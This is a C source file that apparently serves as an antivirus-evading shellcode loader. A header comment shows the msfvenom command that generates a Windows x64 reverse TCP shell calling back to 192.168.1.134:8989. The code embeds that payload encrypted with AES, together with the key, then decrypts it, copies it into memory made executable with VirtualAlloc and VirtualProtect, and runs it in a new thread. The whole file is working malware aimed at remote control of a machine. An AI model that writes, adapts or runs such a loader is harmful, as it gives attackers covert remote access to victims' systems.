/***
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.134 LPORT=8989 > reverse.bi
Payload_encrypted AES injection

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	char key[] = { 0xa8, 0xb3, 0xd7, 0x24, 0x78, 0xea, 0x3a, 0xa8, 0xe9, 0x42, 0xc6, 0xfb, 0x5c, 0x72, 0x8, 0x32 };
	unsigned char reverse_payload[] = { 0x13, 0xe4, 0x82, 0x50, 0x7a, 0xd7, 0xff, 0xb4, 0x68, 0xf6, 0xad, 0xeb, 0x37, 0x81, 0xb3, 0xde, 0x81, 0xdb, 0x58, 0x9e, 0xe2, 0xe, 0x9b, 0x1c, 0x42, 0x9a, 0x51, 0xa2, 0x47, 0xe8, 0x8f, 0x4c, 0x99, 0xab, 0x3a, 0xca, 0x2, 0xbd, 0x42, 0x8a, 0xe0, 0xae, 0x85, 0xe5, 0xa0, 0xe5, 0xca, 0xb4, 0x1d, 0x95, 0x7c, 0x24, 0x9e, 0x2b, 0xe5, 0xb8, 0xcb, 0x3c, 0xf3, 0x1b, 0x7d, 0xa8, 0xea, 0x65, 0x4e, 0xaf, 0xfd, 0x34, 0x32, 0x9a, 0x43, 0x7c, 0x49, 0x2, 0x4d, 0x1e, 0x27, 0x9c, 0xf1, 0x2c, 0xbe, 0xc5, 0x48, 0x77, 0x1b, 0xb2, 0x70, 0x8c, 0xca, 0xc3, 0x82, 0xfd, 0x41, 0x68, 0x17, 0xde, 0x3b, 0x82, 0x16, 0xb, 0x53, 0xc4, 0x23, 0x27, 0x9a, 0x23, 0xfd, 0x98, 0xe0, 0x95, 0x42, 0x3a, 0xc9, 0xae, 0x50, 0xed, 0xc3, 0xd1, 0xd6, 0x41, 0x7f, 0xfb, 0x5e, 0x20, 0xc4, 0x27, 0x71, 0x42, 0x4b, 0x93, 0x36, 0x5c, 0xc7, 0x0, 0x95, 0x4d, 0x13, 0x38, 0xa2, 0x56, 0x23, 0x2b, 0x24, 0xae, 0xc, 0xea, 0x18, 0x28, 0x55, 0xea, 0x9d, 0x8c, 0xb2, 0x48, 0xcf, 0x68, 0x34, 0x29, 0x23, 0x8a, 0x66, 0x82, 0x89, 0xd7, 0x6b, 0xb8, 0x37, 0xde, 0xf6, 0xb3, 0x23, 0xce, 0x48, 0xb, 0xd8, 0xcf, 0x87, 0xfe, 0xd1, 0xa0, 0x63, 0xe, 0x90, 0xfd, 0x99, 0xb3, 0x9e, 0x38, 0x65, 0x1a, 0x8f, 0xba, 0x90, 0x7c, 0xba, 0x4e, 0xbc, 0xf8, 0x84, 0x57, 0x41, 0x96, 0x9a, 0x49, 0xc8, 0xaa, 0x21, 0xff, 0xe7, 0xd5, 0x43, 0xdc, 0xec, 0x28, 0x8b, 0x92, 0xcc, 0xd3, 0x17, 0xfc, 0x7, 0x1e, 0x10, 0x0, 0xb9, 0x77, 0xe, 0x5f, 0x17, 0xaa, 0x48, 0x2a, 0x18, 0xbc, 0xd6, 0xbe, 0x80, 0x3b, 0xb6, 0x68, 0xc4, 0x87, 0xb8, 0xc4, 0x5c, 0xab, 0xf9, 0xdb, 0x15, 0x89, 0xb0, 0xee, 0x51, 0x8e, 0x4e, 0xfd, 0xfb, 0x60, 0x89, 0x3b, 0xb0, 0x3b, 0x42, 0x63, 0x61, 0x4, 0x2c, 0xb2, 0xfa, 0x3f, 0x78, 0x6f, 0x94, 0x76, 0xf6, 0xa7, 0xda, 0x1f, 0xeb, 0xb3, 0xdd, 0x4a, 0x2, 0x9e, 0x74, 0x66, 0x6b, 0x5c, 0xc0, 0x81, 0x88, 0xe, 0x1c, 0x9c, 0x9c, 0xb7, 0x4c, 0x64, 0xf7, 0x8a, 0x23, 0xfd, 0xab, 0x42, 0xf2, 0x3e, 0x54, 0x3b, 0xcb, 0x40, 0x2, 0x3b, 0xac, 0x34, 0x6e, 0x7e, 0xac, 0x64, 0xc9, 0x5e, 0xb, 0x1e, 0xbd, 0xac, 0x59, 0xfe, 0x2e, 0x97, 0xf0, 0xf4, 0x6f, 0x1f, 0xa4, 0x24, 0x77, 0x2a, 0x1c, 0x1b, 0xf8, 0x8d, 0xa7, 0xe7, 0x97, 0x4c, 0xa8, 0xc8, 0x5e, 0x77, 0x4d, 0x73, 0x98, 0x56, 0xcd, 0x9a, 0x1c, 0xb2, 0x4b, 0x32, 0x93, 0x8d, 0xc2, 0x31, 0x89, 0x83, 0x3c, 0x7d, 0x56, 0x83, 0x4a, 0xb1, 0x88, 0x98, 0xe5, 0xb1, 0x91, 0x77, 0x92, 0x53, 0x74, 0x28, 0xf6, 0x50, 0xff, 0xfa, 0x5b, 0x3f, 0x86, 0xde, 0xfa, 0xd6, 0xcd, 0xbb, 0xe2, 0xf8, 0x6b, 0xeb, 0x9e, 0xe2, 0x9b, 0x4c, 0x57, 0x11, 0x76, 0xd5, 0xbd, 0xf9, 0x3b, 0x43, 0x11, 0x4f, 0x97, 0x8d, 0xfb, 0x52, 0x9c, 0x9b, 0x44, 0xbb, 0x9d, 0x6a, 0x8f, 0x11, 0xe4, 0x84, 0xe8, 0x27, 0x46, 0xb7, 0x20, 0x65, 0x63, 0x93, 0xdc, 0x94, 0xf5, 0xaa, 0x80, 0xd9, 0xdc, 0xf1, 0x95, 0x46, 0x15, 0x7c, 0x7b, 0x66, 0xf9, 0xce, 0x5a, 0x75, 0x6d, 0x39, 0xb3, 0x63, 0x2b, 0x76, 0xc1, 0x50, 0x32, 0xab, 0x7e, 0x9d, 0x5e, 0x7 };
	unsigned int calc_len = sizeof(reverse_payload);
	
	// Allocate memory for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "reverse_payload addr", (void *)reverse_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt payload
	AESDecrypt((char *) reverse_payload, calc_len, key, sizeof(key));
	
	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, reverse_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
